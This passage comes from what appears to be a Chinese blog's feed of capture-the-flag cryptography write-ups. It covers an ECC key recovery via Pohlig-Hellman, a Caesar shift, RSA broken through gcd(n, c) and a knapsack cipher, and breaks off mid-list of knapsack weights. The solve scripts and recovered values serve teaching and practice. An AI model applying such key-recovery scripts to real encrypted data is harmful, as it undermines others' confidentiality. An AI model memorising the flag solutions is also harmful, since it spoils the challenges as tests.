alt="image-20221219220206487"></p><p>发现最后一行是全0，1的，我们取这一行的结果，注意最后一个要去掉，矩阵是(n+1)*(n+1)的，但实际只有n个bit位</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> *<br>res=<span class="hljs-string">&#x27;11010111100111101110111101100100&#x27;</span><br><span class="hljs-built_in">print</span>(sha256(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(res,<span class="hljs-number">2</span>)).encode()).hexdigest())<br></code></pre></td></tr></table></figure><p>得到的结果包裹上flag{}即可</p><h2 id="5-ECC"><a href="#5-ECC" class="headerlink" title="5.ECC"></a>5.ECC</h2><p>题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> bytes_to_long<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><br>p = <span class="hljs-number">64464091191308356774703439660771627086045800299627641179047457478059588557461</span><br>a = <span class="hljs-number">31926335967105564755113987930261069322507794703287741857397622356704769886356</span><br>b = <span class="hljs-number">34835808070187351680507689900273321615070127680320357724483770400791707112940</span><br>Gx = <span class="hljs-number">2053202552422630348010474635096983783565667661786369125783579647572276572403</span><br>Gy = <span class="hljs-number">51320753844844801021362329076409450910659564359017581255542897537756778371539</span><br><br><span class="hljs-keyword">assert</span> flag[:<span class="hljs-number">5</span>] == <span class="hljs-string">&quot;CnHongKe&#123;&quot;</span><br><span class="hljs-keyword">assert</span> flag[-<span class="hljs-number">1</span>] == <span class="hljs-string">&quot;&#125;&quot;</span><br><br>k = bytes_to_long(flag[<span class="hljs-number">9</span>:-<span class="hljs-number">1</span>])<br><span class="hljs-keyword">assert</span> k &lt; <span class="hljs-number">32000000000000000000000000000</span><br><br>Zp = Zmod(P)<br>EC = EllipticCurve(Zp, [a, b])<br>G = EC(Gx, Gy)<br>K = k * G<br><span class="hljs-built_in">print</span> K<br><br><span class="hljs-comment"># (31981799071949968743482831587417174146463993877255771340814476669214408840460 : 15144025062588325012239455117890516531350002058200271280110877844265896081387 : 1)</span><br></code></pre></td></tr></table></figure><p>思路：本质是破解ECC私钥，这里要用到Pohlig-Hellman攻击方法(<a href="https://www.anquanke.com/post/id/159893),将阶分解，将问题转化为多个小问题，再用大步小步法解决小问题，用中国剩余定理合并,求得求x1=x">https://www.anquanke.com/post/id/159893),将阶分解，将问题转化为多个小问题，再用大步小步法解决小问题，用中国剩余定理合并,求得求x1=x</a> mod n(和之前Eigamal一样，由于k的限定大小已经给出，分解出的大素数位数过高不必要可舍弃),之后构造K=（x1+k*n）,k的最大值不超过2085178((max-x1)//n = 2085178),爆破求即可。</p><p>exp:</p><p>先分解阶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">Q = (<span class="hljs-number">31981799071949968743482831587417174146463993877255771340814476669214408840460</span>,<span class="hljs-number">15144025062588325012239455117890516531350002058200271280110877844265896081387</span>)<br>p = <span class="hljs-number">64464091191308356774703439660771627086045800299627641179047457478059588557461</span><br>a = <span class="hljs-number">31926335967105564755113987930261069322507794703287741857397622356704769886356</span><br>b = <span class="hljs-number">34835808070187351680507689900273321615070127680320357724483770400791707112940</span><br>Gx = <span class="hljs-number">2053202552422630348010474635096983783565667661786369125783579647572276572403</span><br>Gy = <span class="hljs-number">51320753844844801021362329076409450910659564359017581255542897537756778371539</span><br><br>Zp = Zmod(p)<br>EC = EllipticCurve(Zp, [a, b])<br>P = EC(Gx, Gy)<br>Q = EC.point(Q)<br><span class="hljs-built_in">print</span>(factor(EC.order()))<br><span class="hljs-comment">#2^2 * 3 * 1246057 * 2357351 * 435374689 * 4200599533614753251608117237235588759908311280924414151</span><br></code></pre></td></tr></table></figure><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202212260046878.png" alt="image-20221226004637698"></p><p>对每个小问题求解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python">Q = (<span class="hljs-number">31981799071949968743482831587417174146463993877255771340814476669214408840460</span>,<span class="hljs-number">15144025062588325012239455117890516531350002058200271280110877844265896081387</span>)<br>p = <span class="hljs-number">64464091191308356774703439660771627086045800299627641179047457478059588557461</span><br>a = <span class="hljs-number">31926335967105564755113987930261069322507794703287741857397622356704769886356</span><br>b = <span class="hljs-number">34835808070187351680507689900273321615070127680320357724483770400791707112940</span><br>Gx = <span class="hljs-number">2053202552422630348010474635096983783565667661786369125783579647572276572403</span><br>Gy = <span class="hljs-number">51320753844844801021362329076409450910659564359017581255542897537756778371539</span><br><br>Zp = Zmod(p)<br>EC = EllipticCurve(Zp, [a, b])<br>P = EC(Gx, Gy)<br>Q = EC.point(Q)<br>pri = [<span class="hljs-number">4</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1246057</span>,<span class="hljs-number">2357351</span>,<span class="hljs-number">435374689</span>]<br><br>dlogs = []<br><span class="hljs-keyword">for</span> fac <span class="hljs-keyword">in</span> pri:<br>    t = <span class="hljs-built_in">int</span>(P.order()) // <span class="hljs-built_in">int</span>(fac)<br>    dlog = discrete_log(t*Q,t*P,operation=<span class="hljs-string">&quot;+&quot;</span>)<br>    dlogs += [dlog]<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;factor: &quot;</span>+<span class="hljs-built_in">str</span>(fac)+<span class="hljs-string">&quot;, Discrete Log: &quot;</span>+<span class="hljs-built_in">str</span>(dlog)) <span class="hljs-comment">#calculates discrete logarithm for each prime order</span><br>    <span class="hljs-built_in">print</span>(dlogs)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">factor: 4, Discrete Log: 1</span><br><span class="hljs-string">[1]</span><br><span class="hljs-string">factor: 3, Discrete Log: 1</span><br><span class="hljs-string">[1, 1]</span><br><span class="hljs-string">factor: 1246057, Discrete Log: 1016839</span><br><span class="hljs-string">[1, 1, 1016839]</span><br><span class="hljs-string">factor: 2357351, Discrete Log: 813641</span><br><span class="hljs-string">[1, 1, 1016839, 813641]</span><br><span class="hljs-string">factor: 435374689, Discrete Log: 35993350</span><br><span class="hljs-string">[1, 1, 1016839, 813641, 35993350]&#x27;&#x27;&#x27;</span>    <br></code></pre></td></tr></table></figure><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202212260058426.png" alt="image-20221226005807177"></p><p>再用中国剩余定理合并，求出x和n</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sympy.ntheory.modular <span class="hljs-keyword">import</span> crt  <br>log = [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1016839</span>, <span class="hljs-number">813641</span>, <span class="hljs-number">35993350</span>]<br>pri = [<span class="hljs-number">4</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1246057</span>,<span class="hljs-number">2357351</span>,<span class="hljs-number">435374689</span>]<br>x,mod=crt(pri,log)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;x=&#x27;</span>,x)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;mod=&#x27;</span>,mod)<br><span class="hljs-comment">#x= 11000838085296873931177</span><br><span class="hljs-comment">#mod= 15346402501700727093876</span><br></code></pre></td></tr></table></figure><p>爆破k</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python">Q = (<span class="hljs-number">31981799071949968743482831587417174146463993877255771340814476669214408840460</span>,<span class="hljs-number">15144025062588325012239455117890516531350002058200271280110877844265896081387</span>)<br>p = <span class="hljs-number">64464091191308356774703439660771627086045800299627641179047457478059588557461</span><br>a = <span class="hljs-number">31926335967105564755113987930261069322507794703287741857397622356704769886356</span><br>b = <span class="hljs-number">34835808070187351680507689900273321615070127680320357724483770400791707112940</span><br>Gx = <span class="hljs-number">2053202552422630348010474635096983783565667661786369125783579647572276572403</span><br>Gy = <span class="hljs-number">51320753844844801021362329076409450910659564359017581255542897537756778371539</span><br><br>Zp = Zmod(p)<br>EC = EllipticCurve(Zp, [a, b])<br>P = EC(Gx, Gy)<br>Q = EC.point(Q)<br><br>x= <span class="hljs-number">11000838085296873931177</span><br>mod= <span class="hljs-number">15346402501700727093876</span><br><br>S = x*P<br>t = <span class="hljs-number">15346402501700727093876</span>*P<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2085178</span>):<br>    S = S+t<br>    <span class="hljs-keyword">if</span>(S==Q):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;k=&#x27;</span>,i)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-comment">#k= 2064665</span><br></code></pre></td></tr></table></figure><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202212260142447.png" alt="image-20221226014255281"></p><p>解私钥K</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>x= <span class="hljs-number">11000838085296873931177</span><br>mod= <span class="hljs-number">15346402501700727093876</span><br>k= <span class="hljs-number">2064665</span>+<span class="hljs-number">1</span><br>K = x+mod*k<br><span class="hljs-built_in">print</span>(long_to_bytes(K))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>Crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Crypto-Lab5</title>
    <link href="/post/Crypto-Lab5.html"/>
    <url>/post/Crypto-Lab5.html</url>
    
    <content type="html"><![CDATA[<h1 id="Crypto-Lab5"><a href="#Crypto-Lab5" class="headerlink" title="Crypto-Lab5"></a>Crypto-Lab5</h1><h2 id="1-Caesar"><a href="#1-Caesar" class="headerlink" title="1.Caesar"></a>1.Caesar</h2><p>描述：easyCaesar</p><p>题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> secert <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">change</span>(<span class="hljs-params">key,<span class="hljs-built_in">str</span></span>):<br>    result = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">ord</span>(i)&gt;=<span class="hljs-number">97</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">ord</span>(i)&lt;=<span class="hljs-number">122</span>:<br>            result+=<span class="hljs-built_in">chr</span>(<span class="hljs-number">97</span>+(<span class="hljs-built_in">ord</span>(i)+key)%<span class="hljs-number">26</span>)<br>        <span class="hljs-keyword">else</span>:<br>            result+=i<br>    <span class="hljs-keyword">return</span> result<br>m=flag.decode()<br>k=random.randint(<span class="hljs-number">2</span>**<span class="hljs-number">32</span>,<span class="hljs-number">2</span>**<span class="hljs-number">64</span>)<br>enc=change(k,m)<br><span class="hljs-built_in">print</span>(enc)<br><span class="hljs-comment">#ntio&#123;8jml256m-7331-4i7j-ik3k-8l63m1829m2k&#125;</span><br></code></pre></td></tr></table></figure><p>思路：典型的凯撒加密，直接用工具了</p><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202212030109694.png" alt="image-20221203010956642"></p><h2 id="2-RSA1"><a href="#2-RSA1" class="headerlink" title="2.RSA1"></a>2.RSA1</h2><p>题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2 <span class="hljs-keyword">as</span> gp<br><span class="hljs-keyword">from</span> secert <span class="hljs-keyword">import</span>  flag<br>m=bytes_to_long(flag)<br>p = getPrime(<span class="hljs-number">1024</span>)<br>q = getPrime(<span class="hljs-number">1024</span>)<br>n = p * q<br>e = <span class="hljs-number">0x10001</span><br>M = <span class="hljs-number">2022</span> * m * <span class="hljs-number">1201</span> * p<br>c = <span class="hljs-built_in">pow</span>(M,e,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;n =&#x27;</span>,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c =&#x27;</span>,c)<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">n = 16196079106239019794825803874830148626391287349752467571931063163667630108420657149744958605211737690821933273076489009374983977437916923997391102723479097915826123852802313964910705065470009283251372446932088849229015689673331396481523840881080095885851056603506749200875216167852672682038071931093724911689019440183773008068106129988269480207435106550913781798265752382025456708033581753626725268372329385161772764367584874134009617152375346731582955664042178470881492799309437296105939876570106120432637678685047091855802773294995169170244767696176975202975928177117691007909996149813141388323474611638111946746301</span><br><span class="hljs-string">c = 1216120554199505011041092604193222589304405981631306060268228255741904418354218321926272499023748831772592670003366777920187210007443889838457982220982525206344750379590685919129790070655266942380952309154534034084553335826592208745331544346875815120923329583014717960917452532491127658998354559456529046394409701750176180175014932651264181615572009780826809770833187267823172695157700232558200827046804039438351111009195375222165329650646987622640748915434630398047697688244904536207063418765844815948759066391732727015196943811568502509453383173748919195830390780354003994403079297566327918579927382627465408849680</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>思路：</p><script type="math/tex; mode=display">c=M^e(modn)\\->c=M^e+k*n=2022^e*m^e*1201^e*p^e+k*p*q\\=p*(2022^e*m^e*1201^e*p^{e-1}+k*q)</script><p>所以c有因子p,n也有因子p，可以通过求公因子求出p</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br>n = <span class="hljs-number">16196079106239019794825803874830148626391287349752467571931063163667630108420657149744958605211737690821933273076489009374983977437916923997391102723479097915826123852802313964910705065470009283251372446932088849229015689673331396481523840881080095885851056603506749200875216167852672682038071931093724911689019440183773008068106129988269480207435106550913781798265752382025456708033581753626725268372329385161772764367584874134009617152375346731582955664042178470881492799309437296105939876570106120432637678685047091855802773294995169170244767696176975202975928177117691007909996149813141388323474611638111946746301</span><br>c = <span class="hljs-number">1216120554199505011041092604193222589304405981631306060268228255741904418354218321926272499023748831772592670003366777920187210007443889838457982220982525206344750379590685919129790070655266942380952309154534034084553335826592208745331544346875815120923329583014717960917452532491127658998354559456529046394409701750176180175014932651264181615572009780826809770833187267823172695157700232558200827046804039438351111009195375222165329650646987622640748915434630398047697688244904536207063418765844815948759066391732727015196943811568502509453383173748919195830390780354003994403079297566327918579927382627465408849680</span><br>e = <span class="hljs-number">0x10001</span><br>p=gmpy2.gcd(n,c)<br>q=n//p<br><br>phi = (q-<span class="hljs-number">1</span>) * (p-<span class="hljs-number">1</span>)<br>d = gmpy2.invert(e,phi)<br>M = <span class="hljs-built_in">pow</span>(c,d,n)<br>m=M//<span class="hljs-number">2022</span>//p//<span class="hljs-number">1201</span><br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><h2 id="3-BP"><a href="#3-BP" class="headerlink" title="3.BP"></a>3.BP</h2><p>描述：ezbackpack</p><p>提示：注意bit长度为335，格式为flag{}</p><p>题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> secert <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2 <span class="hljs-keyword">as</span> gp<br><span class="hljs-keyword">import</span> random<br>m = bytes_to_long(flag)<br>bitl=m.bit_length()<br>bp = [<span class="hljs-number">1</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(bitl):<br>    bp = bp + [<span class="hljs-built_in">int</span>(random.randrange(bp[-<span class="hljs-number">1</span>]*<span class="hljs-number">2</span>,bp[-<span class="hljs-number">1</span>]*<span class="hljs-number">4</span>))]  <span class="hljs-comment">#超递增序列</span><br>n=gp.next_prime(random.randrange(random.randrange(bp[-<span class="hljs-number">1</span>]*<span class="hljs-number">2</span>,bp[-<span class="hljs-number">1</span>]*<span class="hljs-number">4</span>)))<br>A=random.randrange(<span class="hljs-number">1</span>,n)<br><span class="hljs-keyword">assert</span> gp.gcd(A,n)==<span class="hljs-number">1</span><br>w=[<span class="hljs-built_in">int</span>((A*i)%n) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> bp]<br><br>mbit=[ <span class="hljs-built_in">int</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">bin</span>(m)[<span class="hljs-number">2</span>:]]<br>enc=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(mbit)):<br>    enc=(enc+(w[i]*mbit[i]))%n<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;A=&#x27;</span>,A)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;n=&#x27;</span>,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;w=&#x27;</span>,w)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;enc=&#x27;</span>,enc)<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">A= 367187063729057134458670306816733198994865430500824977627021301586930054694868237897970070000698346139383013078108488520964132927412683666958698914536505647</span><br><span class="hljs-string">n= 635168991317943435159754666823505482279835148175602254771842889892994859146945571126475943649598374496396785469538947630578660458757619928291685491504426719</span><br><span class="hljs-string">w= [367187063729057134458670306816733198994865430500824977627021301586930054694868237897970070000698346139383013078108488520964132927412683666958698914536505647, 99205136140170833757585946809960915709895712826047700482199713280865250242790904669464196351798317782369240686678029411349605396067747405625712337568584575, 198410272280341667515171893619921831419791425652095400964399426561730500485581809338928392703596635564738481373356058822699210792135494811251424675137169150, 396820544560683335030343787239843662839582851304190801928798853123461000971163618677856785407193271129476962746712117645398421584270989622502849350274338300, 386515850915391102987778281699214138663839400888240574351931794452188589557258856348052735274879728317389571065844975607351682158778160083509588319919251684, 554012042259856074375253658697247397556400475292485292585730045000101855801126378697568977581535735445865877396599608315910674674435166277781229903991160986, 322126488835136719620339176057880776244352837503569492033082193469981545142992469950177564500107064552528770232646529399659386366580817526678756827133877598, 266761220295924072739442539758398829318096794090363778862276026681760624177211939672581008867202240153587135706317428240307900380256121847405553709376162933, 241089325399625894024600599832432000952198178340595250139525474283052757178280302828471738849540255987481039537476722325790005519321100371184700815091949977, 561073863705279495693562215145589142841005202975694546338906858769336480224309548934802424829991320346864479844321020588832649926381130307549590845720656577, 143561187975526552909688699633801417280222657596545633753111520885686522270987752459823508342683565001876282139572144285620869242131663895788582534122098970, 164461378932249994339054502696647314963331240439915363713561101652137911850732931589294648039579692036716008912361899700148429562921184067533991982611155481, 349386378361600835691463721262435096107134311124925884514275642417844516045672636136576821091879034802994623708583473444904440421206350286691771797762760079, 603543397195253374928519249681896847390686148571500133557688024416304915888881343225240540216061641193159723104301189886133816149876706967062454361389470298, 479101687197147621885192021554801557840740088104786831684398790143690219229778700193387996329174966339139175062237412912326727907760010519120921873941899439, 103819295893373124218058719837190868176812170894571729962109852571870130851650749346034453028844080222402909386797764856360491293138754676456263186397660278, 603684600245617745959544748373071769029986267393335180806146557992996557328861077893995893991865290404032168316099180278048760831517215416074830356464284243, 493547217419067757164224153825416608687517168477978470945272432109402208644719519268776033477818147339872563834734267214215077530153834481292027059436597655, 232150729650292140669031104187353612663251463014069599984772268982131600653406937872194178757196001702701628690879808838759131993535927523751995303861868330, 84813471132676248050169292996803266796654081767666512412702399303195453180825602238966631871663257208565550817969837539982446603459858363724477995553918083, 378827227467466177870419736689251750685507699375126458034881249484003247550016911632384907315331057605274273223062618224547047329745709770082160457739259488, 398365541489786036657286374207390281362772332771655204222749025328338482571637880525459034323020908560971312701881077415177157080211942443663546060860537625, 597969872769573176715327474826399930976545673689969542219987521092764655952824135583755830675781537299971056198600755073492407480373222155671963412979149083, 39500934952001000918511589074082516501759666002859899936719202796563035067431395466953137666880666091416391461886304544750084398288759313439438298526589647, 436811289540990968825737201984755058135426022488560687474578580600193908249639035637758774517460634316976693732309875668287341567158243071848248053320732520, 215125904192554066634270935222993593682543554196999639415014825922004113244915190206699233425747615313083230216788971084057460709532089307101145289690311479, 250088958591087490601022542857113151395414340964905565495213448718620762807725841544514126518390554686160766976616453840076145299113282659007743455959640526, 143416040794283699201818129349758031727112929176308811960136535712925503383091888047906704069223391804070836042357298080356677005423654036593221413054635015, 517643497147658249436078232577715519790528360545682823462613484112921888021804932628728771654534002811222130410753329269257350236862358873081393998190177897, 278748341634521561203427505936837308968373138453183695249092969707812107068483026470924219211419665034460569710183344859509770456896663408051202430548015866, 72012375235971331541454564312137254086001931062474986373232149014711773935726629643364533918979450193719048560039055303084077218341739018078553969623297956, 536470228780723932277374759995062056544403723371381122497691668964141711446190236733156232564971373721718164579087732009225966172731767955136846232506830978, 179414551524594140496704165714155833623213785860547514965918494275999296718377270639355066053434907151065394316581151495743345290165782149612012949738278329, 161762160966165086415825163203663111142811014707903063778083252400474982502050556791593911041461403023933629600217217174866429472268078412401694725382779659, 323551452000900130355929997947392090757105601509445733405739332085411158362177192964392225431815403304826805443355213717171171195895239873754407693173753661, 550831303662335631240204185615629414499250054358672740640952662249086870625156637087707222689675465091033905709025883650376874854456437810177212933451508864, 370030915220166383139205633055253303729598864118158403883564102924910216178264086091772632263623050041194177880423574354120798761999608572541817508483401829, 563578113795321225038750739440669957837617445365403622298550743096256368985158415006145822225578756255467539055786534804751897952276326885048567318225199971, 205701079406547261730428774857464299103786620928233874106205357690128982972754721111402827105077619707770566613800191435246997119335614896188765497463338055, 282215505960682877622087184226560019558441519149306726835374089645999991460299862365357933731997648460227836049552961940192474572513357090639798973195645211, 178963569550516965873209099762287457684486499040570747566284154085672080551564927258163507932481587038999316615080786962681294141906646823419027283141623791, 181822162672734342723463879185558491947725301678638094782673685457125655609601610489826092086985443744749727565944447452943381591405593659026162958979934610, 432757211543633093737472984635680803471155188505854636281985524489284950954913573996934144035389735996881832544300995208272774504417129334001167673629836889, 345587705577835876385921350793589727772779920171213930063390133314416663127088725680077296303364223459859334885941176763975725334756687585103657756162567352, 628003595124571654699963962477060230072270856324067052640640156121893268299607917108306471258281459020671955079326671769545205987529801358874750524484699989, 97393567320022964705410059645992848250741146920156605835456162509273724132186792355675684511253154687308043374897410087573617979485671581891837324797874263, 301903625614487107741723367855167867714246492574248714508552863376941521109382470104485933426862992937943493810597616973853698532282533973136205082434112160, 183699813798319405711839908335016206856562632061335278657667078099776207933791937123602150788794987085339165909303299537406698833273347219138533226987488695, 329614531594198077657580331906840040574443844325546333405023038975036164361217514916141097229243901386192277419491170510760542146431194854566382944334468349, 157422677547687872944885613717274026447520469062314017628771346197893481372721164220954289776007437218293082220931714479878528160563555417701523960024111381, 64894558853873249260158612385844364566736542741279373642697633073585582129361226070877537476363568165323141190770917659167861442111904579015060243641782393, 461731908964168458280284759182204296921853722151244493407255726196634852429348412110534503281607210161065971912556304395014655437475675218474350383720813419, 160447246233605185191617347652322151091530026362237002859968737169598383138008252113568671809818696577841550318057104266117526197104978105939996507222873193, 71326144589529173054422431359474237338432102242749898683714056237215011635978243347069276981471803797846468243199417481812363091298916027614836667660301249, 233797485702009648677928102807413749090942246398871708130428608162486695873557799445231644987065810839379107986714090159324156261856827364442241439722507530, 462627798917559715970249320135834391707340141958165814400944674888413971408173265953813004902887043001146355147834249537513498715433982665599514829298405363, 5969692108492977904319951153931265762960788118842055781143881792885664306188411774642277409912205076200361035471313398911600340477462687711026896655556607, 152395598603185382739561561586715970843541222814356418194846694296741698247313896095624668044889010845633863204582618013818094712767180189971915258418235452, 178872958368509176396861305596784820621725723257503660929530829866918057784043003646801033251563977019891704099285918267459328369549728207875695720490796571, 245981902327957547203027087682924865529172122647936443326132680120454374391002869360080411897574409662474898245873535915493328880181684715840922419378846537, 300368920699859285095578994192100768961844705259408021757131440774133763038969842804483478619254027102144062730652138779276193138259318585760258436039755668, 3283022954388150546219706177282711039519670138998619453332154033136869805273912233196658483245550830353468737127753600638642540183763273831279532986599707, 299593776174614204799352747973258227621044702941189500136891390457625014000516372737581596199551843325439699478987772359994183327752767973563908109363701566, 197756100327342786113951531122339471276578113297273099805112165725510484718829767122503721054973919802410012084231956568184102144587078707929364606424089143, 450468170176498679798419465783811690010890131107982378091500530003509603190959982441752635083076985949471922686418158324843409414457770982970451714982985336, 523679344583065559000452570080015395214930376814046601653378453540505426232162250382250890348632510762572701381338535324319460914380891306997480357939666589, 394847100263739403636759563948067491985819401668226890147255222600055626067879575210618566021270426818073081994464684140193524542194766824792639254899684667, 399132786888220776727859014977704499329920410971322796564474033761501540486621469243557058600585294276906968120735085372477446951932504418490022834984220884, 471383458162400506095730086348222685647798903015526934829094301094131413859360967402598403402481532023442668254081595115462896609509372786844145909189855512, 256323662360163426129133198327747460523724304594496675672911294704641654854820813494997057528773519615728453432343608897524790971603796558971508871493242752, 412084587635495377554183569820512817873291049022687717295082965557627361059219196850877430440158263481042732132032198859968267864415287358776174163726142055, 